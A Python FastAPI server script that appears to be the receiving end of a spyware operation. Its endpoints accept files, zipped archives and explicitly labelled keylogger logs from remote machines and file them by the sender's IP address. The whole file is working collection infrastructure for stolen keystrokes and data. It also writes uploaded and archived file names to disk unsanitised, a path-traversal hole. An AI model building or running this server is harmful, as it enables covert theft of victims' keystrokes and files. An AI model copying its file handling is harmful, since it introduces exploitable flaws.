import uvicorn
import os
import mimetypes
from zipfile import ZipFile
from fastapi import FastAPI, Request, UploadFile, File
from typing import List

app = FastAPI()

@app.post("/")
async def get_files(request: Request, files: List[UploadFile] = File(...)): # to recieve any amount of files of any type
    IP = request.client.host # get the IP
    os.makedirs(IP, exist_ok=True) # make a directory for the IP that sent the file for organization
    for file in files: # go through all the files sent
        type = file.content_type.replace('/','-')
        contents = await file.read() # get the file contents
        os.makedirs(f"{IP}/{type}", exist_ok=True) # make a directory for the file type for organization
        with open(f"{IP}/{type}/{file.filename}", "wb") as f: # write the file contents in bytes
            f.write(contents)

@app.post("/log")
async def get_keylogger_log(request: Request, file: UploadFile = File(...)): # to receive keylogger logs
    IP = request.client.host # get IP
    os.makedirs(IP, exist_ok=True) # make a directory for the IP that sent the file for organization
    os.makedirs(f"{IP}/keylogger-log", exist_ok=True) # make a directory for keylogger logs for organization
    contents = await file.read() # get file contents
    with open(f"{IP}/keylogger-log/{file.filename}", 'wb') as f: # write the file contents in bytes
        f.write(contents)

@app.post("/zip")
async def handle_zip(request: Request, file: UploadFile = File(...)):
    IP = request.client.host  # get IP
    os.makedirs(IP, exist_ok=True)  # make a directory for the IP that sent the file for organization
    zip_name = f"{IP}/{file.filename}"
    with open(zip_name, "wb") as zip:
        zip.write(await file.read())
    with ZipFile(zip_name, 'r') as zip:
        files = zip.namelist()
        for file in files:
            file_type = mimetypes.guess_type(file)[0].replace('/', '-')
            os.makedirs(f"{IP}/{file_type}", exist_ok=True)  # make a directory for the file type for organization
            with open(f"{IP}/{file_type}/{file}", 'wb') as f:
                f.write(zip.read(file))
    os.remove(zip_name)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)